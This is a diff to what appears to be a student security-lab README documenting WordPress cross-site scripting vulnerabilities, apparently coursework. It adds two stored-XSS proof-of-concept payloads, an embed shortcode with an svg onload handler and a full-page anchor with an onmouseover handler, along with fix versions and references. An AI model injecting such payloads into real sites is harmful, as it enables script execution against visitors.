@@ -13,17 +13,22 @@ Time spent: **10** hours spent in total
     - Fixed in version: 4.2.13
   - [ ] GIF Walkthrough: <img src="Youtube.gif">
   - [ ] Steps to recreate: 
+  [embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]
   - [ ] Affected source code:https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
-1. (Required) Vulnerability Name or ID
+    - [Link 1](https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8)
+  - [ ] Reference: https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
+2. (Required) WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)
   - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
+    - Vulnerability types:XSS
+    - Tested in version: 4.2 
+    - Fixed in version: 4.2.4
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate: 
+  
+  <a href='/wp-admin/' title="" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(1)//'>Test</a>
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+    - [Link 1](https://core.trac.wordpress.org/changeset/33549)
+  - [ ] Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
 1. (Required) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
